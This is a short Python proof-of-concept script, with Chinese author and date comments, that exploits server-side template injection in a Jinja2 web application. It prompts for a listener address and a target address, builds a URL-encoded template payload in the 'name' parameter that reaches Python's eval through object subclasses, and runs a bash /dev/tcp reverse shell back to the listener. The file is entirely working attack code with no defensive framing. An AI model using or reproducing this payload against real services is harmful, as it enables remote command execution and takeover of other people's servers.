#作者：吴适怀
#时间：2018.12.31
#地点：网信公司宿舍

import requests

monitoring_ip = input("monitoring ip:")
monitoring_port = input("monitoring port:")
id = "bash+-c+%5C%27sh+-i+%26%3E%2Fdev%2Ftcp%2F"+monitoring_ip+"%2F"+monitoring_port+"+0%3E%261%5C%27"
service_ip = input("service ip:")
service_port = input("service port:")   
service_url = "http://"+service_ip+":"+service_port
poc = "/?name=%7B%25+for+c+in+%5B%5D.__class__.__base__.__subclasses__%28%29+%25%7D%0A%7B%25+if+c.__name__+%3D%3D+%27catch_warnings%27+%25%7D%0A++%7B%25+for+b+in+c.__init__.__globals__.values%28%29+%25%7D%0A++%7B%25+if+b.__class__+%3D%3D+%7B%7D.__class__+%25%7D%0A++++%7B%25+if+%27eval%27+in+b.keys%28%29+%25%7D%0A++++++%7B%7B+b%5B%27eval%27%5D%28%27__import__%28%22os%22%29.popen%28%22"+id+"%22%29.read%28%29%27%29+%7D%7D%0A++++%7B%25+endif+%25%7D%0A++%7B%25+endif+%25%7D%0A++%7B%25+endfor+%25%7D%0A%7B%25+endif+%25%7D%0A%7B%25+endfor+%25%7D"
url = service_url+poc
test = requests.get(url=url)